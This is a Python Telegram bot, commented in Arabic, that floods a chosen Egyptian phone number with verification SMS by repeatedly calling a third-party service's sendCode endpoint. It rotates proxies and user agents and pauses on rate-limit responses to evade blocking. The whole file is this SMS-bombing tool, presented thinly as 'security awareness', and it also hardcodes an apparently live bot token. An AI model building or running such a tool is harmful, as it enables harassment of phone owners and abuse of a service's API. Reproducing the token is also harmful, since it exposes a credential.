import telebot
import requests
import json
import random
import time
from telebot import types

# الإعدادات الأساسية
API_TOKEN = '7725928700:AAFN07OWx1xPNhvqRwaBskGz-9CvP6YV6W0'
bot = telebot.TeleBot(API_TOKEN)

# بيانات البروكسي والـ User-Agents من كودك الأصلي
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
]

proxies_list = [
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://116.202.121.34:3128'}
]

# تخزين حالة المستخدم مؤقتاً
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "🚀 *أهلاً بك في بوت إرسال رسائل التوعية*\n\n"
        "هذا البوت مخصص لأغراض الاختبار والتوعية الأمنية.\n"
        "الرجاء إرسال رقم الهاتف (بدون مفتاح الدولة 20)."
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown')
    bot.register_next_step_handler(message, get_number)

def get_number(message):
    number = message.text
    if not number.isdigit() or len(number) < 10:
        bot.reply_to(message, "❌ خطأ: يرجى إدخال رقم هاتف مصري صحيح.")
        return start(message)
    
    user_data[message.chat.id] = {'number': number}
    bot.send_message(message.chat.id, "🔢 كم عدد الرسائل التي تريد إرسالها؟")
    bot.register_next_step_handler(message, start_spam)

def start_spam(message):
    chat_id = message.chat.id
    try:
        count = int(message.text)
        number = user_data[chat_id]['number']
    except (ValueError, KeyError):
        bot.send_message(chat_id, "❌ خطأ في المدخلات. ابدأ من جديد /start")
        return

    bot.send_message(chat_id, f"⏳ جاري بدء العملية لـ {count} رسائل على الرقم {number}...")

    success = 0
    fail = 0
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    payload = json.dumps({"dial": f"2{number}"})

    for i in range(count):
        proxy = random.choice(proxies_list)
        headers = {
            'User-Agent': random.choice(user_agents),
            'Content-Type': "application/json",
            'platform': "android",
        }

        try:
            response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
            if response.status_code == 200:
                success += 1
            elif response.status_code == 429:
                bot.send_message(chat_id, "⚠️ تم اكتشاف حظر مؤقت (429). سأنتظر قليلاً...")
                time.sleep(30)
                fail += 1
            else:
                fail += 1
        except:
            fail += 1

        # تحديث الحالة كل 5 رسائل لتجنب إزعاج التلجرام
        if (i + 1) % 5 == 0:
            bot.send_message(chat_id, f"📊 تحديث: تم إرسال {i+1}/{count}...")
        
        time.sleep(random.uniform(2, 4))

    # النتيجة النهائية
    final_report = (
        "✅ *اكتملت العملية*\n\n"
        f"📱 الرقم: `{number}`\n"
        f"🟢 نجاح: {success}\n"
        f"🔴 فشل: {fail}"
    )
    bot.send_message(chat_id, final_report, parse_mode='Markdown')

if __name__ == "__main__":
    print("البوت يعمل الآن...")
    bot.polling(none_stop=True)